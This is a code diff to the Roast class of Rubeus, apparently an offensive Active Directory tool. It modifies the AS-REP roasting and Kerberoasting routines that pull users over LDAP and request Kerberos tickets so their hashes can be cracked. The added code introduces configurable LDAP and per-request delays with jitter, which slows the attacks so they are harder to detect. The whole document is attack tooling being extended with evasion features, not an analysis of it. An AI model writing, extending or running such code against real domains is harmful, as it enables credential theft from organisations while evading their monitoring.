@@ -13,7 +13,7 @@ namespace Rubeus
 {
     public class Roast
     {
-        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false)
+        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false, int ldapdelay = 0, int asdelay = 0, int jitter = 0)
         {
             if (!String.IsNullOrEmpty(userName))
             {
@@ -41,6 +41,27 @@ namespace Rubeus
             }
             else
             {
+
+                if (ldapdelay != 0)
+                {
+                    Console.WriteLine($"[*] Using a delay of {ldapdelay} seconds after LDAP request.");
+                    if (jitter != 0)
+                    {
+                        Console.WriteLine($"[*] Using a jitter of {jitter}% after LDAP request.");
+                    }
+                    Console.WriteLine();
+                }
+
+                if (asdelay != 0)
+                {
+                    Console.WriteLine($"[*] Using a delay of {asdelay} milliseconds between AS requests.");
+                    if (jitter != 0)
+                    {
+                        Console.WriteLine($"[*] Using a jitter of {jitter}% between AS requests.");
+                    }
+                    Console.WriteLine();
+                }
+
                 string userSearchFilter = "";
 
                 if (String.IsNullOrEmpty(userName))
@@ -72,6 +93,7 @@ namespace Rubeus
                     Console.WriteLine("[X] No users found to AS-REP roast!");
                 }
 
+                Helpers.RandomDelayWithJitter(ldapdelay * 1000, jitter);
                 foreach (IDictionary<string, Object> user in users)
                 {
                     string samAccountName = (string)user["samaccountname"];
@@ -80,6 +102,7 @@ namespace Rubeus
                     Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
 
                     GetASRepHash(samAccountName, domain, domainController, format, outFile);
+                    Helpers.RandomDelayWithJitter(asdelay, jitter);
                 }
             }
 
@@ -181,7 +204,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int ldapdelay = 0, int tgsdelay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
         {
             if (userStats)
             {
@@ -214,9 +237,19 @@ namespace Rubeus
                 return;
             }
 
-            if(delay != 0)
+            if (ldapdelay != 0)
             {
-                Console.WriteLine($"[*] Using a delay of {delay} milliseconds between TGS requests.");
+                Console.WriteLine($"[*] Using a delay of {ldapdelay} seconds after LDAP request.");
+                if (jitter != 0)
+                {
+                    Console.WriteLine($"[*] Using a jitter of {jitter}% after LDAP request.");
+                }
+                Console.WriteLine();
+            }
+
+            if (tgsdelay != 0)
+            {
+                Console.WriteLine($"[*] Using a delay of {tgsdelay} milliseconds between TGS requests.");
                 if(jitter != 0)
                 {
                     Console.WriteLine($"[*] Using a jitter of {jitter}% between TGS requests.");
@@ -450,6 +483,12 @@ namespace Rubeus
                     // used to keep track of years that users had passwords last set in
                     SortedDictionary<int, int> userPWDsetYears = new SortedDictionary<int, int>();
 
+                    if (!userStats)
+                    {
+                        // convert ldapdelay in ms
+                        Helpers.RandomDelayWithJitter(ldapdelay*1000, jitter);
+                    }
+
                     foreach (IDictionary<string, Object> user in users)
                     {
                         string samAccountName = (string)user["samaccountname"];
@@ -529,26 +568,26 @@ namespace Rubeus
                                 }
                                 
                                 bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, etype);
-                                Helpers.RandomDelayWithJitter(delay, jitter);
+                                Helpers.RandomDelayWithJitter(tgsdelay, jitter);
                                 if (!result && autoenterprise)
                                 {
                                     Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                     servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                     GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, etype);
-                                    Helpers.RandomDelayWithJitter(delay, jitter);
+                                    Helpers.RandomDelayWithJitter(tgsdelay, jitter);
                                 }
                             }
                             else
                             {
                                 // otherwise use the KerberosRequestorSecurityToken method
                                 bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
-                                Helpers.RandomDelayWithJitter(delay, jitter);
+                                Helpers.RandomDelayWithJitter(tgsdelay, jitter);
                                 if (!result && autoenterprise)
                                 {
                                     Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                     servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                     GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
-                                    Helpers.RandomDelayWithJitter(delay, jitter);
+                                    Helpers.RandomDelayWithJitter(tgsdelay, jitter);
                                 }
                             }
                         }
